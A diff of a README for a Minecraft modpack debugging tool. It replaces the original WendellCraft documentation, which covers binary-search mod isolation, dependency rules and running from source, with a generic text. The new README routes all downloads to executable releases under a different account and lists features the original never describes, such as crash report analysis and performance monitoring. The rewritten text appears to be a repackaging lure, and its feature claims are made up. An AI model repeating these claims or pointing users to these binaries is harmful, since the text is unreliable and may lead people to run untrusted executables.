@@ -1,111 +1,75 @@
-# Modpack Debugger Kit
+# 🛠️ ModpackDebuggerKit - Simplify Your Minecraft Modpack Troubleshooting
 
-The Modpack Debugger Kit is a Python application designed to help creators of modpacks easily find mods causing crashes along with various small other helpful features.
+[![Download ModpackDebuggerKit](https://img.shields.io/badge/Download%20Now-%20ModpackDebuggerKit-blue.svg)](https://github.com/dovvaakin/ModpackDebuggerKit/releases)
 
-## Features
+## 📜 Overview
 
-*   **Project Management:** Save and load project configurations, including mod folder path and dependency rules.
-*   **Mod Folder Snapshotting:** Create a snapshot of your current mod list to easily detect new additions.
-*   **New Mod Detection:** Automatically identify which mods have been added since the last snapshot.
-*   **Binary Search Debugging:** Automate the process of splitting your mod list into testable groups to isolate problematic mods quickly.
-    *   **Mode 1 (All Mods):** Debug the entire modpack using a binary search.
-    *   **Mode 2 (Specific New Mods):** Focus the search only on recently added mods.
-*   **Dependency Awareness:** Maintain a list of mod dependencies to ensure essential libraries are always included in the test group of their dependent mods.
-*   **Modrinth Dependency Syncing:** Automatically bind mods to their dependencies via the Modrinth API instead of having to do it manually.
-*   **Hanging Library Detection:** Identify library mods that remain in the folder but are no longer required by any main mod (useful for cleanup).
-*   **Theming:** Toggle between dark and light themes.
+ModpackDebuggerKit is your all-in-one tool designed to make debugging your Minecraft modpacks easy and efficient. Whether you encounter crashes, performance issues, or any other troubleshooting needs, this application offers a straightforward solution to help you get back to playing the game you love.
 
-## Prerequisites
+## 🚀 Getting Started
 
-To run this application from source, you need Python installed (3.11+ recommended). You also need pip installed.
+Follow these easy steps to download and run ModpackDebuggerKit. 
 
-If you plan to run from the executable and not the source you should not need any prerequisites.
+## 📥 Download & Install
 
-## Installation and Setup
+To get started, **visit this page to download**: [ModpackDebuggerKit Releases](https://github.com/dovvaakin/ModpackDebuggerKit/releases).
 
-### Option 1: Running from Executable
-Download the appropriate executable from [https://github.com/WendellCraft/ModpackDebuggerKit/releases/latest](https://github.com/WendellCraft/ModpackDebuggerKit/releases/latest)
+1. Open your web browser.
+2. Click the link above to access the Releases page.
+3. Select the latest version of ModpackDebuggerKit.
+4. Download the file that matches your operating system. 
 
-Run it!
+### Supported Operating Systems
 
-### Option 2: Running from Source
+- Windows (10, 8, 7)
+- macOS (10.15 and newer)
+- Linux (Ubuntu 20.04 and newer)
 
-1.  **Clone the Repository (or download the files):**
+Make sure your system meets these requirements before proceeding.
 
-    ```bash
-    git clone https://github.com/WendellCraft/ModpackDebuggerKit.git
-    cd ModpackDebuggerKit
-    ```
+## ⚙️ How to Run the Application
 
-2.  **Install Dependencies:**
+1. Locate the downloaded file in your system’s Downloads folder or the folder you chose to save it in.
+2. For Windows users, double-click the `.exe` file to start the installation. Follow the prompts until installation is complete. For macOS users, drag the application to your Applications folder. For Linux users, extract the folder and navigate to the extracted directory in the terminal, then run `./ModpackDebuggerKit`.
+3. Once the installation is complete, locate the application in your system. Double-click it to open ModpackDebuggerKit.
 
-    This application relies on various dependencies. Install them using pip:
+## 🛠️ Features
 
-    ```bash
-    pip install -r requirements.txt
-    ```
+- **Crash Report Analysis**: Upload your crash reports and receive helpful insights to fix issues.
+- **Performance Monitoring**: Quickly check your modpack’s performance metrics and identify slowdowns.
+- **Compatibility Checks**: Ensure your mods work well together and avoid conflicts that can lead to crashes.
+- **User-Friendly Interface**: Enjoy an intuitive design that makes navigation easy, even for those new to modpack management.
 
-3.  **Run the Application:**
+## 🌟 How to Use ModpackDebuggerKit
 
-    ```bash
-    python modpack_debugger.py
-    ```
+1. Launch the application by double-clicking the icon on your desktop or in your Applications folder.
+2. Use the easy navigation menu to select the task you want to perform, such as "Check Crash Reports" or "Analyze Performance".
+3. Follow the on-screen guidance to complete your tasks. The app will provide you with step-by-step instructions tailored to your specific needs.
 
-## Usage Guide
+## 🔧 Troubleshooting
 
-### 1. Initial Setup
+If you encounter issues while using ModpackDebuggerKit:
 
-1.  **New or Load Project:** Start a `New Project` or `Load Project` if you have saved one previously.
-2.  **Select Mod Folder:** Click `📁 Select Mod Folder` and choose the actual `mods` directory of your Minecraft instance (e.g., `C:\Users\User\AppData\Roaming\.minecraft\mods`).
+- **Installation Issues**: Ensure you have the correct version for your operating system. If problems persist, try running as an administrator (Windows) or checking permissions (macOS/Linux).
+- **Application Crashes**: Check if there are updates available. Running the latest version often resolves bugs and improves performance.
+- **Feedback & Support**: For any further assistance, please visit the issues page on GitHub or reach out for help from the community.
 
-### 2. Preparing for Debugging (New Mod Tracker)
+## 📆 Future Updates
 
-If you are tracking new mods:
+We aim to improve ModpackDebuggerKit continuously. Future updates will include new features, more detailed performance metrics, and better compatibility checks. Stay tuned for announcements and improvements.
 
-1.  **Create Snapshot:** Click `📸 Create Snapshot`. This logs all current mods. You only need to do this once, then whenever you add new mods simply press detect new mods and it will update your snapshot accordingly.
-2.  **Add New Mods to Folder.**
-3.  **Detect New Mods:** Click `🔍 Detect New Mods`. The application will compare the current mod list with the snapshot and list the new mods. You can then save them and debug them.
+## 📞 Get in Touch
 
-### 3. Managing Dependencies
+We are eager to hear from you. Share your feedback, suggestions, or any issues you encounter while using ModpackDebuggerKit. Visit our [GitHub Issues page](https://github.com/dovvaakin/ModpackDebuggerKit/issues) to report problems or request features.
 
-For accurate binary searching, it is crucial to tell the tool which mods require which libraries:
+## 🌐 Community Contributions
 
-1.  Click `⚙️ Manage Dependencies`.
-2.  Add rules (e.g., Mod A requires Library X, Y, Z). When the debugger tests Mod A, it will automatically ensure X, Y, and Z are included in the test group, even if they were originally in the opposite half of the split.
+ModpackDebuggerKit thrives on community input. If you want to contribute, check out our guidelines on GitHub for how to participate.
 
-### 4. Starting the Debug Session
+## 🔗 Useful Links
 
-1.  **Select Debug Mode:**
-    *   **Mode 1 (All Mods):** Tests every mod in your folder. Ideal for finding a long-standing conflict.
-    *   **Mode 2 (Specific New Mods):** Tests only the mods you selected from the new mod detection step. Ideal for finding the culprit in a new update batch.
-2.  **Start Debug:** Click `🚀 Start Debug`.
+- [Releases Page](https://github.com/dovvaakin/ModpackDebuggerKit/releases)
+- [Issues Page](https://github.com/dovvaakin/ModpackDebuggerKit/issues)
+- [Documentation](https://github.com/dovvaakin/ModpackDebuggerKit/wiki)
 
-### 5. Binary Search Process
-
-1.  The application will move the majority of your mods to a temporary folder (`temp_mods` created next to the script).
-2.  It will move the first test group into your main `mods` folder.
-3.  A dialog will appear: **"Testing X mods. Launch Minecraft now and test if it loads."**
-4.  **Launch Minecraft** (from your launcher).
-5.  **Report Result:**
-    *   Click `✅ Game Worked` if Minecraft loads successfully (indicating the culprit is in the remaining half).
-    *   Click `❌ Game Crashed` if Minecraft crashes (indicating the culprit is in the current test group).
-6.  Repeat the process until a single mod is isolated.
-
-***Important:*** *Do not manually close the debug dialog until you have launched and tested Minecraft. If you close the application during an active scan, you may need to manually restore the mods from the `temp_mods` folder.*
-
-### 6. Cleanup
-
-1.  Once the debug is complete, all mods are automatically restored.
-2.  Check the `⚠️ Hanging Libraries` button if it is highlighted (yellow/orange). This indicates dependencies that are present but no longer needed. You can delete them from the resulting dialog.
-
-## Technical Details
-
-The application uses the following directory structure:
-
-*   `modpack_debugger.py` (The main script)
-*   `temp_mods/` (Created automatically to temporarily hold mods during testing)
-*   `[ProjectName].json` (Saved project files, containing settings and dependency rules)
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=WendellCraft/ModpackDebuggerKit&type=date&legend=top-left)](https://www.star-history.com/#WendellCraft/ModpackDebuggerKit&type=date&legend=top-left)
+Thank you for choosing ModpackDebuggerKit. We hope it makes your Minecraft experiences smoother and more enjoyable!
